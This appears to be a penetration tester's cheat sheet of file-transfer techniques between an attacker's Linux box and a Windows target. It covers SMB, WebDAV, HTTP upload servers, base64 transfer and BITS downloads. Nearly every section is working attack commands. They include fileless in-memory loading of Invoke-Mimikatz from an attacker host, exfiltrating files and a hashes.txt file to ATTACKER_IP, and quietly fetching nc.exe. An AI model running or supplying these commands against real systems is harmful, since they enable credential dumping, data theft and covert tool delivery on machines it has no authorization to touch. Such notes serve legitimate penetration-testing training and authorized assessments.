

### 1. SMB File Transfer (Port 445)

>[!TIP] **Update:** Modern Windows versions block "Guest" access. You often need a dummy username/password to make `copy` work.

**Attacker (Linux):**

Bash

```
# Start an SMB server with credentials to bypass 'Unauthenticated Guest' blocks
sudo impacket-smbserver share . -smb2support -user user -password pass

OR 

sudo  smbserver.py  share . -smb2support -user user -password pass
```

**Target (Windows):**

PowerShell

```
# Authenticate and map the drive first, then copy
net use n: \\<ATTACKER_IP>\share /user:user pass
copy n:\tool.exe C:\Windows\Temp\tool.exe
```

---

### 2. In-Memory Execution (Fileless)

>[!IMPORTANT] **Update:** If the target has no internet (DNS error), you **must** download the script to your Arch box first.

**Attacker (Linux):**

Bash

```
# Download script to Arch first, then host locally
wget https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1
python3 -m http.server 80
```

**Target (Windows):**

PowerShell

```
# Point to YOUR IP, not GitHub
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-Mimikatz.ps1')
```

---

### 3. Web Upload (Exfiltrating Data)

>[!INFO] **Update:** You hit the `python3 -m uploadserver` error earlier because you used `pipx`. Use the direct command.

**Attacker (Linux):**

Bash

```
# Using the pipx binary directly
uploadserver 8000
```

**Target (Windows):**

PowerShell

```
# If GitHub is blocked, pull PSUpload.ps1 from your OWN machine first
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:8000/PSUpload.ps1')
Invoke-FileUpload -Uri http://<ATTACKER_IP>:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

---

### 4. WebDAV Bypass (HTTP Port 80)

>[!CAUTION] **Update:** Since you're on **Arch Linux**, remember to use `--break-system-packages` if you aren't using a venv for `wsgidav`.

**Attacker (Linux):**

Bash

```
sudo pip3 install wsgidav cheroot --break-system-packages
wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

**Target (Windows):**

DOS

```
# Note: DavWWWRoot is a keyword, not a real folder on your Linux box
dir \\<ATTACKER_IP>\DavWWWRoot
copy C:\Users\Public\hashes.txt \\<ATTACKER_IP>\DavWWWRoot\hashes.txt
```

---

### 5. Base64 "Pure Text" Transfer

>[!WARNING] **Update:** Remember to verify the transfer! If one character is missing from your copy-paste, the `.exe` will be corrupted.

**Attacker (Linux):**

Bash

```
cat tool.exe | base64 -w 0 > b64_string.txt
md5sum tool.exe
```

**Target (Windows):**

PowerShell

```
[IO.File]::WriteAllBytes("C:\Windows\Temp\tool.exe", [Convert]::FromBase64String("PASTE_STRING_HERE"))
# Verify the hash matches the attacker
Get-FileHash C:\Windows\Temp\tool.exe -Algorithm MD5
```

---

### 6. The "Quick & Dirty" PowerShell Download

If `IEX` is giving you trouble, use the `Start-BitsTransfer` or `Invoke-WebRequest` method as a backup.

**Target (Windows):**

PowerShell

```
# Method A: BITS (Very quiet, used by Windows Update)
Start-BitsTransfer -Source http://<IP>/nc.exe -Destination C:\Temp\nc.exe

# Method B: IWR (The standard wget/curl equivalent)
iwr http://<IP>/nc.exe -OutFile nc.exe
```

